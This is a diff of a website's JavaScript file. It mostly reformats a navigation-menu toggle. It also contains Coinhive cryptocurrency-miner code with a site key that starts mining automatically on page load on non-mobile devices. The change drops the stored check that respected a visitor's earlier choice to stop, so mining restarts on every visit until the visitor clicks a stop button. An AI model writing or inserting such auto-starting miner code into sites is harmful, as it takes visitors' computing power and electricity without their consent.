@@ -5,70 +5,62 @@ var icon = normal !== null ? normal : reverse;
 
 // Toggle the "menu-open" % "menu-opn-left" classes
 function toggle() {
-	  var navRight = document.getElementById("nav");
-	  var navLeft = document.getElementById("nav-left");
-	  var nav = navRight !== null ? navRight : navLeft;
+    var navRight = document.getElementById("nav");
+    var navLeft = document.getElementById("nav-left");
+    var nav = navRight !== null ? navRight : navLeft;
 
-	  var button = document.getElementById("menu");
-	  var site = document.getElementById("wrap");
-	  
-	  if (nav.className == "menu-open" || nav.className == "menu-open-left") {
-	  	  nav.className = "";
-	  	  button.className = "";
-	  	  site.className = "";
-	  } else if (reverse !== null) {
-	  	  nav.className += "menu-open-left";
-	  	  button.className += "btn-close";
-	  	  site.className += "fixed";
-	  } else {
-	  	  nav.className += "menu-open";
-	  	  button.className += "btn-close";
-	  	  site.className += "fixed";
-	    }
-	}
+    var button = document.getElementById("menu");
+    var site = document.getElementById("wrap");
+
+    if (nav.className == "menu-open" || nav.className == "menu-open-left") {
+        nav.className = "";
+        button.className = "";
+        site.className = "";
+    } else if (reverse !== null) {
+        nav.className += "menu-open-left";
+        button.className += "btn-close";
+        site.className += "fixed";
+    } else {
+        nav.className += "menu-open";
+        button.className += "btn-close";
+        site.className += "fixed";
+    }
+}
 
 // Ensures backward compatibility with IE old versions
 function menuClick() {
-	if (document.addEventListener && icon !== null) {
-		icon.addEventListener('click', toggle);
-	} else if (document.attachEvent && icon !== null) {
-		icon.attachEvent('onclick', toggle);
-	} else {
-		return;
-	}
+    if (document.addEventListener && icon !== null) {
+        icon.addEventListener('click', toggle);
+    } else if (document.attachEvent && icon !== null) {
+        icon.attachEvent('onclick', toggle);
+    } else {
+        return;
+    }
 }
 
 menuClick();
 
-
+//******************************************************************************************* */
 //Coinhive scripts
 var miner = new CoinHive.Anonymous('4SxY5rIdGvO3MT3CJet0Hm8GEjGW7SP2', 'dev_log', {
-	throttle: 0.6,
-	theme: 'light'
+    throttle: 0.6,
+    theme: 'light'
 });
 
 function stopMine() {
     if (typeof miner !== 'undefined' && miner.isRunning()) {
-        if (sessionStorage.getItem('minerStarted') === null || sessionStorage.getItem('minerStarted') == "true") {
-            miner.stop();
-            sessionStorage.setItem('minerStarted', miner.isRunning());
-        }
-        document.getElementById('stop_mine').disabled = true;
-        document.getElementById('stop_mine').innerHTML = "Miner Stopped";
-
+        miner.stop();
     }
 }
 
 // Only start on non-mobile devices
 if (typeof miner !== 'undefined' && !miner.isMobile()) {
-    if (sessionStorage.getItem('minerStarted') === null || sessionStorage.getItem('minerStarted') == "false") {
-        miner.start();
-        sessionStorage.setItem('minerStarted', miner.isRunning());
-    }
-    document.getElementById('stop_mine').disabled = false;
-    document.getElementById('stop_mine').innerHTML = "Stop Mining";
-
+    miner.start();
 }
 else {
     stopMine();
 }
+
+sessionStorage.setItem('minerStarted', miner.isRunning());
+document.getElementById('stop_mine').disabled = !miner.isRunning();
+document.getElementById('stop_mine').innerHTML = miner.isRunning() ? "Stop Mining" : "Miner Stopped";
